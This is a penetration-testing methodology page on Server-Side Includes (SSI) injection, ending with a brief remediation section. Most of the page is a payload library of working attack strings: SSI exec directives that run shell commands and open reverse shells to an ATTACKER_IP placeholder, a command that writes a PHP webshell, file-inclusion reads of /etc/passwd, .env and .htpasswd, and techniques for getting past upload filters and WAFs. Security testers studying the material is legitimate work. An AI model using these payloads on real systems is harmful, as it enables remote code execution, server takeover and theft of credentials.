---
title: "Server-Side Includes (SSI) Injection"
date: 2026-02-24
draft: false
---

# Server-Side Includes (SSI) Injection

> **Severity**: High–Critical | **CWE**: CWE-97
> **OWASP**: A03:2021 – Injection

---

## What Is SSI Injection?

Server-Side Includes are directives embedded in HTML files that the web server processes before sending the response. When user input is reflected in `.shtml`, `.shtm`, `.stm`, or SSI-enabled pages without sanitization, injected directives execute with web-server privileges.

```
Apache SSI directive syntax: <!--#directive param="value" -->
IIS SSI directive syntax:    <!--#include file="..." -->

Injected: <!--#exec cmd="id" --> → server executes 'id' and includes output
```

SSI is **underrated** in modern apps because:
- Legacy apps still use `.shtml` pages
- Some upload endpoints process SSI in stored files
- Nginx/Apache `includes` modules still deployed
- SSI in HTTP headers (via Server Side Include modules processing headers)

---

## Discovery Checklist

**Phase 1 — Identify SSI Processing**
- [ ] Check for `.shtml`, `.shtm`, `.stm`, `.html` files that include dynamic content
- [ ] Check `Server` header: Apache with `mod_include` or IIS with SSI enabled
- [ ] Check for `X-Powered-By: ASP.NET` on IIS (SSI often enabled)
- [ ] Inject `<!--#echo var="DATE_LOCAL" -->` — if date is rendered → SSI active
- [ ] Check file upload endpoints: does uploading a `.shtml` file get served with SSI processing?
- [ ] Check error pages for SSI (customized 404/500 pages that include SSI directives)
- [ ] Check `Content-Type` of responses — `.shtml` may be set to `text/html` with SSI processing

**Phase 2 — Injection Surface**
- [ ] Form fields reflected in page (name, comment, address)
- [ ] URL parameters echoed back
- [ ] HTTP headers reflected (User-Agent, Referer, X-Forwarded-For)
- [ ] File upload — name stored and displayed
- [ ] Search fields — query echoed in page

**Phase 3 — Escalation**
- [ ] Confirm SSI with harmless variable echo
- [ ] Test `#exec cmd` for RCE
- [ ] Test `#include` for LFI
- [ ] Test stored SSI (inject in profile, save, load page)

---

## Payload Library

### Payload 1 — Detection and Fingerprinting

```
<!-- Environment variable echo (safe, no side effects) -->
<!--#echo var="DATE_LOCAL"-->
<!--#echo var="DOCUMENT_NAME"-->
<!--#echo var="SERVER_NAME"-->
<!--#echo var="SERVER_SOFTWARE"-->
<!--#echo var="HTTP_USER_AGENT"-->
<!--#echo var="REMOTE_ADDR"-->
<!--#echo var="QUERY_STRING"-->
<!--#echo var="HTTP_COOKIE"-->
<!--#echo var="AUTH_TYPE"-->

<!-- Print all environment variables: -->
<!--#printenv-->

<!-- IIS SSI detection: -->
<!--#echo var="ALL_HTTP"-->
<!--#echo var="SERVER_NAME"-->

<!-- Test if SSI processed (set variable, read it back): -->
<!--#set var="test" value="ssi_works"-->
<!--#echo var="test"-->
```

### Payload 2 — RCE via `#exec`

```bash
# exec cmd — runs shell command, output inserted into page:
<!--#exec cmd="id"-->
<!--#exec cmd="whoami"-->
<!--#exec cmd="hostname"-->
<!--#exec cmd="cat /etc/passwd"-->
<!--#exec cmd="ls /var/www/html"-->

# Reverse shell:
<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"-->
<!--#exec cmd="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"-->

# Write webshell via exec:
<!--#exec cmd="echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"-->

# Windows IIS SSI (#exec via cmd.exe):
<!--#exec cmd="cmd.exe /c whoami"-->
<!--#exec cmd="cmd.exe /c dir C:\inetpub\wwwroot"-->
<!--#exec cmd="cmd.exe /c net user"-->
<!--#exec cmd="cmd.exe /c powershell -enc BASE64_ENCODED_COMMAND"-->

# exec cgi — execute a CGI script:
<!--#exec cgi="/cgi-bin/reverse_shell.sh"-->

# URL-encoded (in GET parameter):
%3C!--%23exec%20cmd%3D%22id%22--%3E
<!--%23exec cmd="id"-->
%3C!--#exec%20cmd=%22id%22--%3E
```

### Payload 3 — LFI via `#include`

```bash
# Include local file (LFI):
<!--#include file="/etc/passwd"-->
<!--#include file="../../../../etc/passwd"-->
<!--#include virtual="/etc/passwd"-->

# file= vs virtual=:
# file: relative path from current document directory
# virtual: path relative to document root (or absolute from root)

<!--#include file="../config.php"-->
<!--#include file="../../.env"-->
<!--#include virtual="/var/www/html/config.php"-->
<!--#include virtual="/etc/httpd/conf/httpd.conf"-->
<!--#include virtual="/.htpasswd"-->

# Windows targets:
<!--#include file="C:\windows\win.ini"-->
<!--#include file="..\..\..\windows\win.ini"-->
<!--#include file="../../../../inetpub/wwwroot/web.config"-->

# Include remote URL (if allow_ssi_remote enabled):
<!--#include virtual="http://COLLABORATOR_ID.oast.pro/test"-->
```

### Payload 4 — Stored SSI via File Upload

```bash
# Upload a file with .shtml extension (or bypass extension filter):
# File content:
cat > payload.shtml << 'EOF'
<html>
<body>
SSI Injection PoC:<br>
User: <!--#exec cmd="id"-->
Hostname: <!--#echo var="SERVER_NAME"-->
File: <!--#include file="/etc/passwd"-->
</body>
</html>
EOF

# If extension filter blocks .shtml — try:
payload.shtml
payload.SHTML
payload.shtm
payload.stm
payload.shtml.jpg    # double extension
payload.shtml%00.jpg # null byte
payload.shtml;.jpg   # semicolon (IIS)

# Upload and access: https://target.com/uploads/payload.shtml
# Or: if server processes all HTML files with SSI:
payload.html
payload.htm

# Bypass Content-Type check (server checks MIME, not extension):
# Set Content-Type: image/jpeg but keep .shtml extension
curl -X POST https://target.com/upload \
  -F "file=@payload.shtml;type=image/jpeg"
```

### Payload 5 — SSI in HTTP Headers

```bash
# If server logs/reflects HTTP headers and processes SSI in error pages or logs:

# User-Agent injection:
curl -A '<!--#exec cmd="id"-->' https://target.com/

# Referer injection:
curl -H 'Referer: <!--#exec cmd="id"-->' https://target.com/

# X-Forwarded-For injection (if shown in error page):
curl -H 'X-Forwarded-For: <!--#exec cmd="whoami"-->' https://target.com/404page

# Combined with log poisoning (then trigger LFI):
# 1. Poison access log:
curl -A '<!--#exec cmd="id"-->' https://target.com/
# 2. Include log via SSI:
<!--#include file="/var/log/apache2/access.log"-->
# → SSI in log is processed when log file is SSI-included
```

### Payload 6 — Bypass Techniques

```bash
# Filter strips <!-- ... -->:
# Use whitespace variations:
<!  --#exec cmd="id"-->
<!-- #exec cmd="id"-->
<!--   #exec   cmd="id"-->

# IIS-specific syntax:
<%#exec cmd="id"%>          # older IIS syntax (rare)

# Encode in URL context:
%3C%21--%23exec%20cmd%3D%22id%22--%3E

# Double encode (if WAF decodes once):
%253C%2521--%2523exec%2520cmd%253D%2522id%2522--%253E

# Newline within directive:
<!--#exec
cmd="id"-->

# Use environment variable to build command:
<!--#set var="cmd" value="id"-->
<!--#exec cmd="$cmd"-->

# Combine set + exec for obfuscation:
<!--#set var="c1" value="i"-->
<!--#set var="c2" value="d"-->
<!--#exec cmd="${c1}${c2}"-->
```

---

## Tools

```bash
# SSI testing with nikto:
nikto -h https://target.com -Plugins "ssi"

# Burp Suite:
# Active Scan → check for "SSI injection" in Server-Side Injection category
# Intruder: inject SSI payloads in all reflected parameters

# Manual injection test (safe):
curl -s "https://target.com/search?q=%3C!--%23echo+var%3D%22SERVER_NAME%22--%3E" | \
  grep -i "target.com\|server\|apache\|nginx"

# Check if .shtml files exist:
ffuf -u "https://target.com/FUZZ.shtml" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,403

# Check Apache SSI config:
curl -sI https://target.com/ | grep -i "server"
# Apache/2.4.xx → check if mod_include compiled in
# "Server: Apache" without "mod_security" → often has SSI

# Upload test for SSI:
echo '<!--#exec cmd="id"-->' > test.shtml
curl -X POST https://target.com/upload \
  -F "file=@test.shtml" \
  -b "session=VALUE"

# Detect via timing (exec with sleep):
time curl -s "https://target.com/?name=%3C!--%23exec+cmd%3D%22sleep+5%22--%3E"

# Grep for SSI processing in Apache config:
grep -rn "Options.*Includes\|XBitHack\|AddType.*text/x-server-parsed-html" \
  /etc/apache2/ 2>/dev/null
```

---

## Remediation Reference

- **Disable SSI globally** if not required: remove `mod_include` from Apache, disable `#exec` in IIS
- **Restrict `#exec`**: in Apache, use `IncludesNOEXEC` instead of `Includes` to allow `#include` but block `#exec`
- **File extension control**: never process SSI on upload directories; restrict SSI processing to static content directories
- **Input encoding**: encode `<`, `>`, `!`, `#`, `-` characters before reflecting user input in SSI-enabled pages
- **Upload restrictions**: rename uploaded files and store outside web root; never allow `.shtml`, `.shtm`, `.stm` extensions
- **Apache directive**: `Options -Includes` in upload/user-content directories

*Part of the Web Application Penetration Testing Methodology series.*
